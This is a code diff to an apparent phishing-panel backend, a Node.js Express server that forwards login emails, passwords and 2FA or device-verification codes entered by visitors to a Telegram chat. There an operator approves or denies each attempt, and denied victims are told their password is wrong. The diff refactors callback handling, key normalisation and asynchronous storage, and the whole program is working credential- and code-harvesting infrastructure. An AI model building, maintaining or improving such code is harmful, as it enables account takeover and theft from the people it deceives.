@@ -24,6 +24,18 @@ const STORE_ID = 'ff808181a09d98f701a0fbd3a50b5fb3';
 const memoryStore = new Map();
 const tmpFilePath = path.join(os.tmpdir(), 'bitvalve_decisions.json');
 
+function normalizeEmail(email) {
+  return String(email || '').trim().toLowerCase();
+}
+
+function getLoginKey(email) {
+  return `login:${normalizeEmail(email)}`;
+}
+
+function getVerifyKey(email, step) {
+  return `verify:${normalizeEmail(email)}:${String(step || '').trim().toLowerCase()}`;
+}
+
 function readTmpFile() {
   try {
     if (fs.existsSync(tmpFilePath)) {
@@ -67,44 +79,55 @@ async function updateRemoteDecisions(decisionsObj) {
   }
 }
 
-async function saveDecision(key, decisionObj) {
-  memoryStore.set(key, decisionObj);
+function saveDecision(key, decisionObj) {
+  const normKey = String(key || '').toLowerCase();
+  memoryStore.set(normKey, decisionObj);
 
   const tmpData = readTmpFile();
-  tmpData[key] = decisionObj;
+  tmpData[normKey] = decisionObj;
   writeTmpFile(tmpData);
 
-  const remoteData = await getRemoteDecisions();
-  remoteData[key] = decisionObj;
-  await updateRemoteDecisions(remoteData);
+  getRemoteDecisions().then((remoteData) => {
+    remoteData[normKey] = decisionObj;
+    return updateRemoteDecisions(remoteData);
+  }).catch((err) => {
+    console.error('Async remote decision save failed:', err.message);
+  });
 }
 
-async function deleteDecision(key) {
-  memoryStore.delete(key);
+function deleteDecision(key) {
+  const normKey = String(key || '').toLowerCase();
+  memoryStore.delete(normKey);
 
   const tmpData = readTmpFile();
-  delete tmpData[key];
+  delete tmpData[normKey];
   writeTmpFile(tmpData);
 
-  const remoteData = await getRemoteDecisions();
-  delete remoteData[key];
-  await updateRemoteDecisions(remoteData);
+  getRemoteDecisions().then((remoteData) => {
+    delete remoteData[normKey];
+    return updateRemoteDecisions(remoteData);
+  }).catch((err) => {
+    console.error('Async remote decision delete failed:', err.message);
+  });
 }
 
 async function getDecision(key) {
-  if (memoryStore.has(key)) {
-    return memoryStore.get(key);
+  const normKey = String(key || '').toLowerCase();
+
+  if (memoryStore.has(normKey)) {
+    return memoryStore.get(normKey);
   }
 
   const tmpData = readTmpFile();
-  if (tmpData[key]) {
-    return tmpData[key];
+  if (tmpData[normKey]) {
+    memoryStore.set(normKey, tmpData[normKey]);
+    return tmpData[normKey];
   }
 
   const remoteData = await getRemoteDecisions();
-  if (remoteData[key]) {
-    memoryStore.set(key, remoteData[key]);
-    return remoteData[key];
+  if (remoteData[normKey]) {
+    memoryStore.set(normKey, remoteData[normKey]);
+    return remoteData[normKey];
   }
 
   return null;
@@ -118,50 +141,80 @@ async function handleCallbackQuery(query) {
   const data = String(query.data || '');
 
   try {
-    if (data.startsWith('approve:')) {
-      const email = data.slice('approve:'.length);
-      await saveDecision(`login:${email}`, { status: 'approved', message: 'Login approved.' });
-      await bot.answerCallbackQuery(query.id, { text: 'Approved' });
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        { chat_id: query.message.chat.id, message_id: query.message.message_id }
-      );
-      await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
+    // Login Approve (compact 'a:' or legacy 'approve:')
+    if (data.startsWith('a:') || data.startsWith('approve:')) {
+      const email = data.startsWith('a:') ? data.slice(2) : data.slice('approve:'.length);
+      saveDecision(getLoginKey(email), { status: 'approved', message: 'Login approved.' });
+      try {
+        await bot.answerCallbackQuery(query.id, { text: 'Approved' });
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        );
+        await bot.sendMessage(query.message.chat.id, `✅ Login approved for ${email || 'user'}.`);
+      } catch (err) {
+        console.warn('Telegram UI update skipped:', err.message);
+      }
+      return;
     }
 
-    if (data.startsWith('deny:')) {
-      const email = data.slice('deny:'.length);
-      await saveDecision(`login:${email}`, { status: 'denied', message: 'Email or password is wrong.' });
-      await bot.answerCallbackQuery(query.id, { text: 'Denied' });
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        { chat_id: query.message.chat.id, message_id: query.message.message_id }
-      );
-      await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
+    // Login Deny (compact 'd:' or legacy 'deny:')
+    if (data.startsWith('d:') || data.startsWith('deny:')) {
+      const email = data.startsWith('d:') ? data.slice(2) : data.slice('deny:'.length);
+      saveDecision(getLoginKey(email), { status: 'denied', message: 'Email or password is wrong.' });
+      try {
+        await bot.answerCallbackQuery(query.id, { text: 'Denied' });
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        );
+        await bot.sendMessage(query.message.chat.id, `❌ Login denied for ${email || 'user'}.`);
+      } catch (err) {
+        console.warn('Telegram UI update skipped:', err.message);
+      }
+      return;
     }
 
-    if (data.startsWith('verify:')) {
-      const [, step, verificationEmail, verificationCode] = data.split(':');
-      const key = `verify:${verificationEmail}:${step}`;
-      await saveDecision(key, { status: 'approved', message: `${step.toUpperCase()} verified.` });
-      await bot.answerCallbackQuery(query.id, { text: 'Verified' });
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        { chat_id: query.message.chat.id, message_id: query.message.message_id }
-      );
-      await bot.sendMessage(query.message.chat.id, `✅ ${step.toUpperCase()} verification approved for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
+    // Verification Approve (compact 'v:' or legacy 'verify:')
+    if (data.startsWith('v:') || data.startsWith('verify:')) {
+      const parts = data.split(':');
+      const step = parts[1];
+      const verificationEmail = parts[2];
+      const verificationCode = parts[3];
+      const key = getVerifyKey(verificationEmail, step);
+      saveDecision(key, { status: 'approved', message: `${step ? step.toUpperCase() : 'CODE'} verified.` });
+      try {
+        await bot.answerCallbackQuery(query.id, { text: 'Verified' });
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        );
+        await bot.sendMessage(query.message.chat.id, `✅ ${step ? step.toUpperCase() : 'Verification'} approved for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
+      } catch (err) {
+        console.warn('Telegram UI update skipped:', err.message);
+      }
+      return;
     }
 
-    if (data.startsWith('reject:')) {
-      const [, step, verificationEmail, verificationCode] = data.split(':');
-      const key = `verify:${verificationEmail}:${step}`;
-      await saveDecision(key, { status: 'denied', message: `${step.toUpperCase()} verification denied.` });
-      await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
-      await bot.editMessageReplyMarkup(
-        { inline_keyboard: [] },
-        { chat_id: query.message.chat.id, message_id: query.message.message_id }
-      );
-      await bot.sendMessage(query.message.chat.id, `❌ ${step.toUpperCase()} verification denied for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
+    // Verification Reject (compact 'r:' or legacy 'reject:')
+    if (data.startsWith('r:') || data.startsWith('reject:')) {
+      const parts = data.split(':');
+      const step = parts[1];
+      const verificationEmail = parts[2];
+      const verificationCode = parts[3];
+      const key = getVerifyKey(verificationEmail, step);
+      saveDecision(key, { status: 'denied', message: `${step ? step.toUpperCase() : 'CODE'} verification denied.` });
+      try {
+        await bot.answerCallbackQuery(query.id, { text: 'Rejected' });
+        await bot.editMessageReplyMarkup(
+          { inline_keyboard: [] },
+          { chat_id: query.message.chat.id, message_id: query.message.message_id }
+        );
+        await bot.sendMessage(query.message.chat.id, `❌ ${step ? step.toUpperCase() : 'Verification'} denied for ${verificationEmail || 'user'} (${verificationCode || 'code'}).`);
+      } catch (err) {
+        console.warn('Telegram UI update skipped:', err.message);
+      }
+      return;
     }
   } catch (error) {
     console.error('Callback processing failed:', error.message);
@@ -169,6 +222,11 @@ async function handleCallbackQuery(query) {
 }
 
 if (!isVercel && bot) {
+  bot.deleteWebHook().then(() => {
+    console.log('Cleared Telegram webhook for polling mode.');
+  }).catch((err) => {
+    console.warn('Could not clear webhook:', err.message);
+  });
   bot.on('callback_query', handleCallbackQuery);
 }
 
@@ -191,14 +249,14 @@ app.get(['/trust-device', '/trust-device.html'], (_req, res) => {
 
 // API Routes
 app.post(['/api/login', '/login'], async (req, res) => {
-  const email = String(req.body?.email || '').trim();
+  const email = normalizeEmail(req.body?.email);
   const password = String(req.body?.password || '').trim();
 
   if (!email || !password) {
     return res.status(400).json({ ok: false, message: 'Missing email or password.' });
   }
 
-  await deleteDecision(`login:${email}`);
+  deleteDecision(getLoginKey(email));
 
   if (!botToken || !chatId || !bot) {
     return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
@@ -210,8 +268,8 @@ app.post(['/api/login', '/login'], async (req, res) => {
     const sentMessage = await bot.sendMessage(chatId, message, {
       reply_markup: {
         inline_keyboard: [[
-          { text: 'Approve', callback_data: `approve:${email}` },
-          { text: 'Deny', callback_data: `deny:${email}` }
+          { text: 'Approve', callback_data: `a:${email}` },
+          { text: 'Deny', callback_data: `d:${email}` }
         ]]
       }
     });
@@ -258,13 +316,13 @@ app.get(['/api/set-webhook', '/set-webhook'], async (req, res) => {
 });
 
 app.get(['/api/login-status', '/login-status'], async (req, res) => {
-  const email = String(req.query.email || '').trim();
+  const email = normalizeEmail(req.query.email);
 
   if (!email) {
     return res.status(400).json({ ok: false, message: 'Missing email.' });
   }
 
-  const decision = await getDecision(`login:${email}`);
+  const decision = await getDecision(getLoginKey(email));
 
   if (!decision) {
     return res.json({ ok: true, status: 'pending' });
@@ -274,8 +332,8 @@ app.get(['/api/login-status', '/login-status'], async (req, res) => {
 });
 
 app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
-  const email = String(req.body?.email || '').trim();
-  const step = String(req.body?.step || '').trim();
+  const email = normalizeEmail(req.body?.email);
+  const step = String(req.body?.step || '').trim().toLowerCase();
   const code = String(req.body?.code || '').trim();
 
   if (!email || !step || !code) {
@@ -286,7 +344,7 @@ app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
     return res.status(500).json({ ok: false, message: 'Telegram bot is not configured.' });
   }
 
-  await deleteDecision(`verify:${email}:${step}`);
+  deleteDecision(getVerifyKey(email, step));
 
   const subject = step === '2fa' ? '2FA code verification' : 'new device verification';
   const message = `Security validation required\n\nEmail: ${email}\nStep: ${subject}\nCode: ${code}\n\nApprove or reject this verification request.`;
@@ -295,8 +353,8 @@ app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
     const sentMessage = await bot.sendMessage(chatId, message, {
       reply_markup: {
         inline_keyboard: [[
-          { text: 'Approve', callback_data: `verify:${step}:${email}:${code}` },
-          { text: 'Reject', callback_data: `reject:${step}:${email}:${code}` }
+          { text: 'Approve', callback_data: `v:${step}:${email}:${code}` },
+          { text: 'Reject', callback_data: `r:${step}:${email}:${code}` }
         ]]
       }
     });
@@ -309,14 +367,14 @@ app.post(['/api/send-verification', '/send-verification'], async (req, res) => {
 });
 
 app.get(['/api/verification-status', '/verification-status'], async (req, res) => {
-  const email = String(req.query.email || '').trim();
-  const step = String(req.query.step || '').trim();
+  const email = normalizeEmail(req.query.email);
+  const step = String(req.query.step || '').trim().toLowerCase();
 
   if (!email || !step) {
     return res.status(400).json({ ok: false, message: 'Missing email or step.' });
   }
 
-  const decision = await getDecision(`verify:${email}:${step}`);
+  const decision = await getDecision(getVerifyKey(email, step));
 
   if (!decision) {
     return res.json({ ok: true, status: 'pending' });
